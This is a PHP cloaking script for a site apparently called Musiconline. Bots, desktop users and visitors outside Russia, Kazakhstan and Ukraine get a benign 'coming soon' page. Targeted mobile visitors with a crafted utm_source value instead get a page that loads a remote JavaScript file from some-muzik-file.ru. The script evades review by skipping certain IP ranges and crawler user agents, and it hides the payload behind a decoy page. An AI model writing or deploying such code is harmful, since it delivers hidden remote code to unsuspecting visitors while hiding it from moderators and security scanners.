<?php
function ShowWhiteHTML()
{
	$ee = 0;
	echo '<!DOCTYPE html>
	<html class="no-js"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Musiconline video</title>
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="all,follow">
    <!-- Bootstrap and Font Awesome css-->
    <link rel="stylesheet" href="/assets/musiconline/font-awesome.css">
    <link rel="stylesheet" href="/assets/musiconline/bootstrap.min.css">
    <!-- Google fonts-->
    <link rel="stylesheet" href="/assets/musiconline/css">
    <link rel="stylesheet" href="/assets/musiconline/css.css">
    <!-- Theme stylesheet-->
    <link rel="stylesheet" href="/assets/musiconline/style.default.css" id="theme-stylesheet">
    <!-- Custom stylesheet - for your changes-->
    <link rel="stylesheet" href="/assets/musiconline/custom.css">
    <!-- Favicon-->
    <link rel="shortcut icon" href="http://soon.ondrejsvestka.cz/favicon.png">
    <!-- Tweaks for older IEs--><!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
        <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script><![endif]--> </head>
  <body style="">
    <div style="background-image: url(&#39;img/video-bg.jpg&#39;)" class="main"> 
      <!-- video background-->
      <!-- replace URLs with your video content URL-->
      <video id="video-background" preload="auto" autoplay="true" loop="loop" muted="muted" volume="0">
        <source src="http://ondrejsvestka.cz/video/silver-lining-video.webm" type="video/webm">
        <source src="http://ondrejsvestka.cz/video/silver-lining-video.mp4" type="video/mp4">
      </video>
      <div class="overlay"></div>
      <div class="container">
         
        <h1 class="cursive">Musiconline скоро заработает</h1>
      <!--    <h2 class="sub">You can expect this beautiful website running soon. </h2>  -->
        <div class="mailing-list">
         <!--   <h3 class="mailing-list-heading">Join our mailing list and we will notify you once it is ready!</h3>  -->
          <div class="row">
            <!-- <form class="form-inline">
              <div class="form-group">
                <label for="email" class="sr-only"></label>
                <input type="email" placeholder="jane.doe@example.com" id="email" class="form-control transparent">
              </div>
              <button class="btn btn-danger">subscribe</button>
            </form> -->
          </div>
        </div>
      </div>
      <div class="footer">
        <div class="container">
          <div class="row">
            <div class="col-md-6">
              <p>©2018 http://musiconline.ml</p>
            </div>
            <div class="col-md-6">
              <p class="credit">Template by tomnolane</p>
            </div>
          </div>
        </div>
      </div>
    </div> 
    <!-- JAVASCRIPT FILES -->
    <script src="/assets/musiconline/analytics.js"></script><script src="/assets/musiconline/jquery.min.js"></script>
    <script>window.jQuery || document.write(\'<script src="javascripts/vendor/jquery-1.11.0.min.js"><\/script>\')</script>
    <script src="/assets/musiconline/bootstrap.min.js"></script>
    <script src="/assets/musiconline/jquery.cookie.js"></script>
    <script src="/assets/musiconline/front.js"></script> 
  
</body><div style="top: 0px; left: 764px;"></div></html>';
}

function ShowGreyHTML()
{
	echo '<!doctype><html><header><noscript><meta http-equiv="refresh"content="0; url=/"></noscript>  <style>body {margin: 0;}</style></header><body>';
	 
	$ee = 1;
	//include 'stat.php'; 
	$a = $_GET['utm_source'];	
	
	if(empty(explode("_", $a)[0]))
	{
		ShowWhiteHTML();
		return;
	}
	
	if(empty(explode("_", $a)[1]))
	{
		ShowWhiteHTML();
		return;
	}
	
	if(empty(explode("_", $a)[2]))
	{
		ShowWhiteHTML();
		return;
	}
     
	echo '<script src="http://some-muzik-file.ru/code/05e8b6c3b326772f51f10f4960096372.js"></script></body></html>';
}

function GetCountry()
{
	$ipaddress = $_SERVER['REMOTE_ADDR'];
	
	$a = $ipaddress;
	$a2 = '79.139.192.0';
	$a3 = '79.139.255.255'; 
	$a4 = '37.9.113.0';
	$a5 = '37.9.113.255'; 
	$a6 = '178.154.171.0';
	$a7 = '178.154.171.255';  
	$a8 = '46.0.0.0';
	$a9 = '46.0.31.255';   
	$a10 = '5.228.128.0';
	$a11 = '5.228.255.255';  
	
	$f1 = ip2long($a);
	$f2 = ip2long($a2);
	$f3 = ip2long($a3);
	$f4 = ip2long($a4);
	$f5 = ip2long($a5);
	$f6 = ip2long($a6);
	$f7 = ip2long($a7);
	$f8 = ip2long($a8);
	$f9 = ip2long($a9);
	$f10 = ip2long($a10);
	$f11 = ip2long($a11);

	if ($f1 <= $f3 && $f2 <= $f1) {
	  return "NONE";
	}
	
	if ($f1 <= $f5 && $f4 <= $f1) {
	  return "NONE";
	}
	
	if ($f1 <= $f7 && $f6 <= $f1) {
	  return "NONE";
	}
	
	if ($f1 <= $f9 && $f8 <= $f1) {
	  return "NONE";
	}
	
	if ($f1 <= $f11 && $f10 <= $f1) {
	  return "NONE";
	}

	$a = json_decode(file_get_contents('https://freegeoip.net/json/'.$ipaddress), true);
	return $a['country_code'];
}

$contry = GetCountry();
if($contry == "RU" || $contry == "KZ" || $contry == "UA") 
{
	require_once 'Mobile_Detect.php';
	$detect = new Mobile_Detect;
	if($detect->isMobile() || $detect->isTablet())
	{
		$a = strtolower($_SERVER['HTTP_USER_AGENT']);

		if(preg_match('/robot|bot|yahoo|mail|crawl|slurp|mediapartners|majesticsEO|facebook|yabrowser|pingdom|get|java|find|dataprovider|spider|crawler|curl|^$/i', $a))
		{
			echo ShowWhiteHTML();
		}
		else  ShowGreyHTML();
	}
	else ShowWhiteHTML();
}
else ShowWhiteHTML();
?>